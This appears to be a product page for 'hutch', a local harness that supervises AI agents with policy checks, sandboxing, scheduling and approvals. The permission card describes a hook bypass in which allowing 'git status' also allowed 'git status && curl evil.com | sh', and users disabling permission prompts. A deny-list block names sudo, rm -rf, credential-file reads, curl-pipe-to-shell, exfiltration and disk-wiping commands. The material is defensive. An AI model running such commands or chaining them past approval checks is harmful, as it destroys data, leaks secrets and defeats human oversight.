Failure classes · Traceability

The failure classes hutch is designed around

These come from public reports and individual users' accounts in 2026. Most are single reports, not measured prevalence, and we have not reproduced them in the other products. Each card says what hutch does about it today and what it does not do yet. Sources and caveats: docs/research/complaints.md.

01 Runaway spend Individual user reports · no single figure verified

An unattended loop keeps calling a paid model

People describe agents looping on a paid model while unattended. We could not verify any particular dollar amount, so none is quoted here.

What hutch does Step and wall-clock limits per run, a per-bot daily token cap, and spend caps for priced hosted models, all checked by the engine and not left to the model. A token cap is not a currency cap; models without a known price cannot have a spend cap and hutch says so.

02 Silent failure HN comments on cron and time zones (26759090, 45727508)

The scheduled run that quietly never happened

Scheduled work can be lost or doubled when the machine sleeps, the clock changes, or a daemon dies, and a dashboard can still look healthy.

What hutch does After sleep it detects missed windows and runs once (or records a visible skip); cron math uses the bot's IANA zone. Each occurrence is claimed with one database transaction, so two schedulers (the dashboard and the daemon, say) cannot both fire it. We raced six processes against the same window: the previous version created six runs, this one creates one.

03 Privacy leak HN #48892468 · HN #49808565

CLI agent uploaded ~/.ssh and the home directory

Two individual Hacker News posts describe privacy failures in other products. They are user reports, not independently verified findings or evidence of prevalence.

What hutch does File tools stay inside the workspace. New bots request strict Linux shell containment: bubblewrap gives the shell a private process namespace and temporary directory, no host network, and only the workspace writable. This is not a virtual machine and does not cover every tool; old bots remain explicitly marked as uncontained until changed.

04 Permission fatigue HN #46268419 · HN #47402197

Relentless nagging ends in YOLO-mode bypasses

Commenters describe turning on --dangerously-skip-permissions to escape constant prompts, and one hook author reports that allowing git status also auto-approved git status && curl evil.com | sh in Claude Code.

What hutch does Ask once and optionally remember a narrow rule you can list and revoke. Command lines are split into every place a command can hide and the worst verdict wins. Hard-denied classes never become allowed by a remembered rule.

05 Orphaned work OpenClaw issue 138499 · open, one reporter, not reproduced by us

A timed-out scheduled task leaves its child process running

One reporter says a cron task that timed out left its background command marked running for more than five hours. It is an open issue with an open fix.

What hutch does Hutch's production runs now use owned processes with recorded boot and start identities. Stop remains visible as "Stopping" until the supervisor verifies cleanup; recovery fences the old owner before it signals recorded processes. Strict Linux shell mode also uses a private PID namespace, which contains detached descendants of that shell. A process outside that namespace or an unverified identity is not signalled by numeric PID.

Architecture · Bento Grid

Designed for visible, local control

The agent prompt loop is simple. hutch is the operational plumbing around it: policy checks, scheduling, approvals, budgets, and an audit trail. Each card separates tested support from experimental areas.

POLICY & LINUX SANDBOX

Policy Engine & Optional OS Containment

Hutch checks tool calls against policy. New bots request strict Linux shell containment; it is not a hardened virtual machine, and availability depends on host support. Existing bots keep their prior setting.

  • Path containment: File tools cannot resolve paths outside the workspace.
  • Environment scrub: Shell commands run with a synthetic HOME and a minimal environment.
  • Compound-command aware: Splits chained commands, pipes, substitutions and wrappers and applies the worst verdict.
  • Fetch checks: web fetches resolve the name, require every address to be public, re-check each redirect and pin the connection to the checked address.
  • Linux shell sandbox: strict mode gives the command a private temporary directory and process namespace and a writable workspace. It does not cover every tool or desktop session.
See the safety model
DETERMINISTIC SCHEDULING

Cron that Survives Real Life

Engineered for real computers that sleep, reboot, travel across timezones, and change DST.

  • Sleep catch-up: Detects missed schedule intervals and coalesces them cleanly into one run.
  • DST & Timezone safe: Explicit IANA timezone handling eliminates duplicate fires and missed hours.
  • One run per bot: A database claim decides which process owns a run and a bot never overlaps itself, even with the dashboard and the daemon both running.
  • Staleness monitors: Flags bots whose last success timestamp exceeds their schedule expectation.
Read the scheduler notes
HUMAN-IN-THE-LOOP

Kind Approvals · Fail-Closed

Supervision that respects developer time without compromising safety.

  • Fail-closed TTL: Unanswered approval requests expire as denied after 10 minutes.
  • Sticky allows: Tick "always allow" once per bot; revoke anytime in the Studio inspector.
  • Browser pauses (experimental): Some detected login or challenge pages can pause a run. Same-session human handoff is unavailable.
  • Browser profiles (experimental): Playwright support exists, but contexts are currently shared within a process. Per-bot profile isolation is unavailable.

LOCAL SOVEREIGNTY

Transcripts, Budgets & Pluggable Runtimes

Everything lives in one directory on your disk, in files you can inspect, back up or delete.

  • Transcripts: Prompts, tool calls, outputs and token counts are written to SQLite and a JSONL mirror with a hash chain.
  • Caps: Max steps, wall-clock timeout and daily token quota per bot; spend caps for priced hosted models.
  • Model choice: Ollama, llama.cpp, LM Studio, OpenAI-compatible and Anthropic endpoints, or the offline mock runtime. Tested against recorded fakes; live runs depend on your setup.
  • Other harnesses (experimental): The built-in agent loop by default, or delegate a bot to Pi or OpenCode. Those run with their own tools, outside hutch's policy gate.

Security Manifest

Deny by class. Ask by default. Record everything.

A policy engine evaluates every tool call before it executes. Risky actions need a human decision and the classes below are refused outright. This is a safeguard for supervised use, not a security boundary against a determined attacker; see the safety model for its limits. 

# refused by the policy layer before execution, whatever a remembered rule says
$ sudo / su / doas                  agents never escalate privileges
$ rm -rf / · ~ · ..                deletions outside the workspace
$ cat ~/.ssh/* · .env · ~/.aws     secret and credential paths
$ curl ... | sh                     pipe-to-interpreter execution
$ cmd | curl                        exfiltration channels
$ dd · mkfs · fork bombs · reboot  system destruction
$ POST/upload flags on fetch tools  data exfiltration
# chained commands are split and judged segment by segment
$ git status && sudo rm -rf /
        segment 1: git status          allowed
        segment 2: sudo rm -rf /       denied
        worst verdict wins             entire command blocked
Quickstart

Two minutes to your first supervised bot

hutch is not published yet. The repository is private and there is no PyPI release, so install from a source checkout you have been given. The included mock model runs the whole pipeline offline without API keys. 

# 1. install from a source checkout (Python 3.11+, Linux)
$ cd hutch
$ pip install -e .

# 2. state directory + 3 starter bots (mock model, no API key)
$ hutch init

# 3. dashboard + approvals
$ hutch serve            http://127.0.0.1:8787

# 4. point a bot at a real model whenever you choose
$ hutch bot update research-briefing --model ollama/llama3.2

# 5. headless daemon: cron, catch-up, approval expiry
$ hutch daemon

Frequently Asked Questions

Fair questions with honest answers

Do I need an API key, credit card, or GPU?

No. hutch includes a built-in deterministic mock runtime that runs the full tool and approval pipeline completely offline for free. When you want real intelligence, connect any local model (Ollama, llama.cpp on CPU or GPU) or any OpenAI-compatible endpoint with an API key.

Does hutch phone home or send telemetry?

hutch itself sends no telemetry and has no accounts; we searched the source for analytics and phone-home code and found none. Your data still leaves the machine whenever you configure something that sends it: a hosted model receives the conversation, and web_fetch and the browser contact the sites you point them at. With a local model and no web tools, nothing is sent. State lives in ~/.local/state/hutch as SQLite and JSONL files you can inspect, back up or delete.

How is hutch different from dots and Grok Bot?

Those products give each agent a computer in the vendor's cloud, which is why they keep working while your devices are off and can be reached from a phone. hutch runs on your own machine with models you choose, so your files stay put and you hold the keys, but it stops when the machine sleeps and it does not yet offer phone supervision. It is also much younger and has fewer integrations.

What happens if my laptop goes to sleep during a scheduled run?

hutch tracks schedule intervals in the bot's IANA timezone. When your machine wakes up, the scheduler detects missed windows and triggers a single catch-up run tagged with +N missed windows, preventing silent run loss and avoiding duplicate execution stampedes.

What happens when a browser bot hits a CAPTCHA or MFA wall?

Some detected login or challenge pages can move a run to "needs you"; hutch never tries to solve a CAPTCHA. Browser support is experimental and requires the optional Playwright extra. A live page handoff is unavailable, and browser contexts are currently shared within a process rather than isolated per bot.
